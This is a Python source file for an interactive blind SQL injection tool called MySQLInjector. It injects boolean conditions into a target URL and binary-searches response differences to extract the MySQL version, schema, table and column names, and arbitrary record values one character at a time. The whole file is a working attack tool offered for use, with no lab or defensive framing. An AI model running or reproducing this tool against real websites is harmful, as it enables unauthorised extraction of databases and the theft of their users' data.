from colorama import Fore, Back, Style
import time
import datetime
import urllib.request
import CLI

class QueryGenerator:

	def schemaCode(schema):
		if(schema == None): return ""
		else: return (schema + ".")

	def tableCode(table):
		if(table == None): return "DUAL"
		return table

	def whereCode(where):
		if(where == None): return ""
		else: return "WHERE "+where

	def limitCode(limit):
		if(limit == None): return ""
		else: return "LIMIT "+limit

	def select(schema, table, column, where, limit):
		output = "SELECT " + column + " FROM " + QueryGenerator.schemaCode(schema) + QueryGenerator.tableCode(table) + " " + QueryGenerator.whereCode(where) + " " + QueryGenerator.limitCode(limit)
		return output

	def length(schema, table, column, where, limit):
		output = QueryGenerator.select(schema, table, "LENGTH("+column+")", where, limit)
		return output

	def count(schema, table, where, limit):
		output = QueryGenerator.select(schema, table, "COUNT(0)", where, limit)
		return output

	def asciiCharacter(schema, table, column, where, limit, characterIndex):
		output = QueryGenerator.select(schema, table, "ASCII(SUBSTR("+column+", " + str(characterIndex) + ", 1))", where, limit)
		return output


global REQUESTS
global TOTAL_REQUESTS
global AVERAGE_TIME
global IS_TRUE
global DEBUG

REQUESTS = 0
TOTAL_REQUESTS = 0
AVERAGE_TIME = 0
IS_TRUE = False


def title():
	print("\n\n\n")
	print(Style.DIM + Fore.GREEN + "                          .ed\"\"\"\" \"\"\"$$$$be.\n                        -\"           ^\"\"**$$$e.\n                      .\"                   '$$$c\n                     /                      \"4$$b\n                    d  3                      $$$$\n                    $  *                   .$$$$$$\n                   .$  ^c           $$$$$e$$$$$$$$.\n                   d$L  4.         4$$$$$$$$$$$$$$b\n                   $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$\n       e$\"\"=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$\n      z$$b. ^c     3$$$F \"$$$$b   $\"$$$$$$$  $$$$*\"      .=\"\"$c\n     4$$$$L        $$P\"  \"$$b   .$ $$$$$...e$$        .=  e$$$.\n     ^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$\n       \"**$$$ec   \"   %ce\"\"    $$$  $$$$$$$$$$*    .r\" =$$$$P\"\"\n             \"*$b.  \"c  *$e.    *** d$$$$$\"L$$    .d\"  e$$***\"\n               ^*$$c ^$c $$$      4J$$$$$% $$$ .e*\".eeP\"\n                  \"$$$$$$\"'$=e....$*$$**$cz$$\" \"..d$*\"\n                    \"*$$$  *=%4.$ L L$ P3$$$F $$$P\"\n                       \"$   \"%*ebJLzb$e$$$$$b $P\"\n                         %..      4$$$$$$$$$$ \"\n                          $$$e   z$$$$$$$$$$%\n                           \"*$c  \"$$$$$$$P\"\n                            .\"\"\"*$$$$$$$$bc\n                         .-\"    .$***$$$\"\"\"*e.\n                      .-\"    .e$\"     \"*$c  ^*b.\n               .=*\"\"\"\"    .e$*\"          \"*bc  \"*$e..\n             .$\"        .z*\"               ^*$e.   \"*****e.\n             $$ee$c   .d\"                     \"*$.        3.\n             ^*$E\")$..$\"                         *   .ee==d%\n                $.d$$$*                           *  J$$$e*\n                 \"\"\"\"\"                              \"$$$\"\n")
	print(Style.DIM + Fore.GREEN + " __  __       ____   ___  _     ___        _           _             \n|  \/  |_   _/ ___| / _ \| |   |_ _|_ __  (_) ___  ___| |_ ___  _ __ \n| |\/| | | | \___ \| | | | |    | || '_ \ | |/ _ \/ __| __/ _ \| '__|\n| |  | | |_| |___) | |_| | |___ | || | | || |  __/ (__| || (_) | |   \n|_|  |_|\__, |____/ \__\_\_____|___|_| |_|/ |\___|\___|\__\___/|_|   \n        |___/                           |__/                         ")
	print("\t\t\t\t\t\t\tVersion: 3.1")
	print("\t\t\t\t\t\t\tAuthor:  3n31ch\n")

def createArrayConfiguration(configuration):
	array = {}
	isAttribute = False
	isValue = 0
	attribute = ""
	value = ""
	inQuotes = False
	for i in range(0,len(configuration)):
		if(isValue > 0):
			if(isValue == 1):
				if(configuration[i] == "\""): 
					inQuotes = True
				else:
					value += configuration[i]
				isValue = 2
			else:
				if(i == (len(configuration) - 1) ):
					value += configuration[i]
					isValue = 0
					array[attribute] = value
					attribute = ""
					value = ""

				if(configuration[i] == " " and inQuotes == False):
					isValue = 0
					array[attribute] = value
					attribute = ""
					value = ""

				elif(configuration[i] == "\"" and inQuotes and configuration[i-1] != "\\"):
					isValue = 0
					array[attribute] = value
					attribute = ""
					value = ""
				else:
					value += configuration[i]

		if(isAttribute):
			if(configuration[i] == " "): 
				isAttribute = 1;
				isAttribute = False
				isValue = True;
			else:
				attribute += configuration[i]
		

		if(configuration[i] == "-" and isValue == False): isAttribute = True

	return array

def redefineUrl(url, qry):
	newUrl = url.replace('$QRY', 'and ' + qry + ' ')
	newUrl = newUrl.replace("'",'%27')
	newUrl = newUrl.replace(" ",'%20')
	return newUrl

def resetRequests():
	global REQUESTS
	REQUESTS = 0

def newRequest(inputUrl, inputQry, isTrue):
	global REQUESTS
	global TOTAL_REQUESTS
	global AVERAGE_TIME
	global IS_TRUE
	global DEBUG

	url = redefineUrl(inputUrl, inputQry)
	initial_time = time.time()

	headers = {'User-Agent': 'Mozilla/5.0'}
	request = urllib.request.Request(url, headers=headers)
	


	#print(url);

	page = urllib.request.urlopen(url).read()


	delayed_time = time.time() - initial_time
	REQUESTS += 1
	TOTAL_REQUESTS += 1
	AVERAGE_TIME = (AVERAGE_TIME + delayed_time)/2
	result = isTrue in str(page)
	IS_TRUE = result


	printStatistics()
	return result

def blindComparation(inputUrl, inputTrue, inputQry, lowerBound, upperSuperior):
	#if(true = "")
	#if(character < cotaInferior or character > upperSuperior): return None
	query = "(" + inputQry + ") " 
	while(True):
		if((upperSuperior - lowerBound) == 1):
			qry2 = query + "= " + str(lowerBound)
			if( newRequest(inputUrl,qry2,inputTrue) ): return lowerBound		
			else: return upperSuperior
		average = int((lowerBound+upperSuperior)/2)
		qry3 = query + "<= " + str(average)
		if( newRequest(inputUrl,qry3,inputTrue) ):
			upperSuperior = average
		else:
			lowerBound = average

def printStatistics():
	global REQUESTS
	global TOTAL_REQUESTS
	global AVERAGE_TIME
	global IS_TRUE

	if(AVERAGE_TIME > 2):
		averageTime = Fore.RED + str( ('%.3f'%(AVERAGE_TIME)) ) + Fore.YELLOW
	elif(AVERAGE_TIME > 1):
		averageTime = Fore.YELLOW + str( ('%.3f'%(AVERAGE_TIME)) ) + Fore.YELLOW
	else:
		averageTime = Fore.GREEN + str( ('%.3f'%(AVERAGE_TIME)) ) + Fore.YELLOW

	if(IS_TRUE):
		lastRequest = Fore.GREEN + "TRUE"+ Fore.RESET
	else:
		lastRequest = Fore.RED + "FALSE"+ Fore.RESET

	statisticsList = [
		["LAST REQUEST", lastRequest],
		["REQUESTS", str(REQUESTS)],
		["TOTAL REQUESTS", str(TOTAL_REQUESTS)],
		["AVERAGE TIME REQUESTS", averageTime]
	]

	out = ""

	for i in range(0,4):
		out+= Fore.YELLOW + statisticsList[i][0] + ": " + Fore.RESET + statisticsList[i][1] + Fore.RESET;
		if i != 3: out+= Fore.CYAN + " | " + Fore.RESET


	#out = Fore.YELLOW + "LAST REQUEST: " + lastRequest + " | REQUESTS: " + Fore.RESET + str(REQUESTS) + Fore.YELLOW + " | TOTAL REQUESTS: " + Fore.RESET + str(TOTAL_REQUESTS) + Fore.YELLOW + " | AVERAGE TIME REQUESTS: " + averageTime + Fore.RESET
	print(out.ljust(120), end="\r\r")

def printer(message, statistics):
	print(message.ljust(120))
	if statistics: printStatistics()
	
def check(url, true):
	qry = "1 = 1"
	t = newRequest(url, qry, true)
	if(t == False): 
		printer(redefineUrl(url, qry), False)
		return False

	qry = "1 = 2"
	f = newRequest(url, qry, true)
	if(f == True): 
		printer(redefineUrl(url, qry), False)
		return False
	return True

def fromTo(count, fr, to):
	if(fr == None): fr = 0
	if(to == None): to = count
	fr = int(fr)
	to = int(to)
	if(count == 0): return [0,0]
	if(fr <= 0): fr = 0
	if(to>count): to = count
	if(fr>=to): return [0,0]
	return [fr, to]



def version(inputUrl, inputTrue):
	name = ""
	qry = QueryGenerator.length(None, None, "VERSION()", None, None)

	lenStr = blindComparation(inputUrl, inputTrue, qry, 0, 200)
	for x in range(1, lenStr+1):
		qry = QueryGenerator.asciiCharacter(None, None, 'VERSION()', None, None, x)
		character = chr(blindComparation(inputUrl, inputTrue, qry, 0, 255))
		name+= character
	return name

def countSchemes(inputUrl, inputTrue):
	qry = QueryGenerator.count("INFORMATION_SCHEMA", "SCHEMATA", "SCHEMA_NAME != 'information_schema'", None);
	count = blindComparation(inputUrl, inputTrue, qry, 0, 200)
	return count

def countTables(inputUrl, inputTrue, schema):
	qry = QueryGenerator.count("INFORMATION_SCHEMA", "TABLES", "TABLE_SCHEMA = '"+ schema +"'", None);
	count = blindComparation(inputUrl, inputTrue, qry, 0, 500)
	return count

def countColumns(inputUrl, inputTrue, schema, table):
	qry = QueryGenerator.count("INFORMATION_SCHEMA", "COLUMNS", "TABLE_SCHEMA = '"+ schema +"' AND TABLE_NAME = '"+table+"'", None);
	count = blindComparation(inputUrl, inputTrue, qry, 0, 200)
	return count

def countRecords(inputUrl, inputTrue, schema, table, where):
	qry = QueryGenerator.count(schema, table, where, None);
	count = blindComparation(inputUrl, inputTrue, qry, 0, 100000)
	return count









def getSchemeName(inputUrl, inputTrue, index):
	name = ""
	qry = QueryGenerator.length("INFORMATION_SCHEMA", "SCHEMATA", "SCHEMA_NAME", "SCHEMA_NAME != 'information_schema'", str(index)+",1")
	lenStr = blindComparation(inputUrl, inputTrue, qry, 0, 200)
	for x in range(1, lenStr+1):
		qry = QueryGenerator.asciiCharacter("INFORMATION_SCHEMA", "SCHEMATA", "SCHEMA_NAME", "SCHEMA_NAME != 'information_schema'", str(index)+",1", x)
		character = chr(blindComparation(inputUrl, inputTrue, qry, 0, 255))
		name+= character
	return name
	
def getTableName(inputUrl, inputTrue, schema, index):
	name = ""
	qry = QueryGenerator.length("INFORMATION_SCHEMA", "TABLES", "TABLE_NAME", "TABLE_SCHEMA = '"+schema+"'", str(index)+",1")
	lenStr = blindComparation(inputUrl, inputTrue, qry, 0, 200)
	for x in range(1, lenStr+1):
		qry = QueryGenerator.asciiCharacter("INFORMATION_SCHEMA", "TABLES", "TABLE_NAME", "TABLE_SCHEMA = '"+schema+"'", str(index)+",1", x)
		character = chr(blindComparation(inputUrl, inputTrue, qry, 0, 255))
		name+= character
	return name

def getColumnName(inputUrl, inputTrue, schema, table, index):
	name = ""
	qry = QueryGenerator.length("INFORMATION_SCHEMA", "COLUMNS", "COLUMN_NAME", "TABLE_SCHEMA = '"+schema+"' AND TABLE_NAME = '"+table+"'", str(index)+",1")
	lenStr = blindComparation(inputUrl, inputTrue, qry, 0, 200)
	for x in range(1, lenStr+1):
		qry = QueryGenerator.asciiCharacter("INFORMATION_SCHEMA", "COLUMNS", "COLUMN_NAME", "TABLE_SCHEMA = '"+schema+"' AND TABLE_NAME = '"+table+"'", str(index)+",1", x)
		character = chr(blindComparation(inputUrl, inputTrue, qry, 0, 255))
		name+= character
	return name


def getValueColumn(inputUrl, inputTrue, schema, table, column, where, index):
	name = ""
	qry = QueryGenerator.length(schema, table, column, where, str(index)+",1")
	lenStr = blindComparation(inputUrl, inputTrue, qry, 0, 200)
	for x in range(1, lenStr+1):
		qry = QueryGenerator.asciiCharacter(schema, table, column, where, str(index)+",1", x)
		character = chr(blindComparation(inputUrl, inputTrue, qry, 0, 255))
		name+= character
	return name

	

	count = blindComparation(inputUrl, inputTrue, qry, 0, 200)
	return count








def commandHelp(configuration):
	print("For more information of a command type help followed by the command")

def commandDefine(configuration):
	#-t time
	#-url 
	print("")

def commandCount(input):
	commandArray = input.split(" ", 1)
	command = commandArray[0]
	configuration = commandArray[1] if len(commandArray) == 2 else ""
	configurationArray = createArrayConfiguration(configuration)
	
	where = None
	url = configurationArray['url']
	true = configurationArray['true']
	if 'where' in configurationArray.keys():
		where = configurationArray['where']


	if(check(url, true) == False):
		printer(Fore.RED + "Binary request ERROR" + Fore.RESET, False)
		return False

	if command == "schemes":
		output = str(countSchemes(url, true)) + " schemes found"

	elif command == "tables":
		schema = configurationArray['s']
		output = str(countTables(url, true, schema)) + " tables found"

	elif command == "columns":
		schema = configurationArray['s']
		table = configurationArray['t']
		output = str(countColumns(url, true, schema, table)) + " columns found"
		
	elif command == "records":
		schema = configurationArray['s']
		table = configurationArray['t']
		output = str(countRecords(url, true, schema, table, where)) + " records found"
		
	printer(output, True)



def commandList(input):
	commandArray = input.split(" ", 1)
	command = commandArray[0]
	configuration = commandArray[1] if len(commandArray) == 2 else ""
	configurationArray = createArrayConfiguration(configuration)
	url = configurationArray['url']
	true = configurationArray['true']
	fr = None
	to = None
	where = None
	if 'from' in configurationArray.keys():
		fr = configurationArray['from']
	if 'to' in configurationArray.keys():
		to = configurationArray['to']
	if 'where' in configurationArray.keys():
		where = configurationArray['where']

	if(check(url, true) == False):
		printer(Fore.RED + "Binary request ERROR" + Fore.RESET, False)
		return False

	if command == "schemes":
		count = countSchemes(url, true)
		printer(str(count) + " schemes found:", True)
		frto = fromTo(count, fr, to)
		for i in range(int(frto[0]), int(frto[1])):
			name = getSchemeName(url, true, i)
			index = "["+ str(i) + "]"
			printer(Fore.YELLOW + index.ljust(4) + " " + Fore.RESET + name, True)


	elif command == "tables":
		schema = configurationArray['s']
		count = countTables(url, true, schema)
		printer(str(count) + " tables found:", True)
		frto = fromTo(count, fr, to)
		for i in range(int(frto[0]), int(frto[1])):
			name = getTableName(url, true, schema, i)
			index = "["+ str(i) + "]"
			printer(Fore.YELLOW + index.ljust(4) + " " + Fore.RESET + name, True)


	elif command == "columns":
		schema = configurationArray['s']
		table = configurationArray['t']
		count = countColumns(url, true, schema, table)
		printer(str(count) + " columns found:", True)
		frto = fromTo(count, fr, to)
		for i in range(int(frto[0]), int(frto[1])):
			name = getColumnName(url, true, schema, table, i)
			index = "["+ str(i) + "]"
			printer(Fore.YELLOW + index.ljust(4) + " " + Fore.RESET + name, True)
		
	elif command == "records":
		schema = configurationArray['s']
		table = configurationArray['t']
		columns = configurationArray['c']
		count = countRecords(url, true, schema, table, where)
		printer(str(count) + " records found:", True)

		frto = fromTo(count, fr, to)
		columnsArray = columns.split(',')

		for i in range(int(frto[0]), int(frto[1])):
			row = "";
			for x in range(0,len(columnsArray)):
				val = getValueColumn(url, true, schema, table, columnsArray[x], where, i)
				row+=  val + " | "

			printer(Fore.YELLOW + "["+ str(i) + "] " + Fore.RESET + " | " + row, True)

def commandVersion(input):
	configurationArray = createArrayConfiguration(input)
	url = configurationArray['url']
	true = configurationArray['true']

	if(check(url, true) == False):
		printer(Fore.RED + "Binary request ERROR" + Fore.RESET, False)
		return False

	ver = version(url, true);
	printer(Fore.RESET + "Database Version: " + Fore.YELLOW + ver + Fore.RESET, True)
		


def commandIndex(input):
	commandArray = input.split(" ", 1)
	command = commandArray[0]
	configuration = commandArray[1] if len(commandArray) == 2 else ""
	if command == "help":
		commandHelp(configuration)
	elif command == "list":
		commandList(configuration)
	elif command == "count":
		commandCount(configuration)
	elif command == "version":
		commandVersion(configuration)
	else:
		print("The command \""+ commandArray[0] +"\" does not exist")
	resetRequests()



program_initial_time = time.time()
title()
while True:
	print("\n")
	command = str(input(Fore.GREEN + '>>> '+ Fore.RESET))
	print("")
	if command == "exit": break
	else: commandIndex(command)
program_excution_time = time.time() - program_initial_time
print(Fore.YELLOW + "Execution time: %s" % datetime.timedelta(seconds=int(program_excution_time)) )
print(Fore.RESET)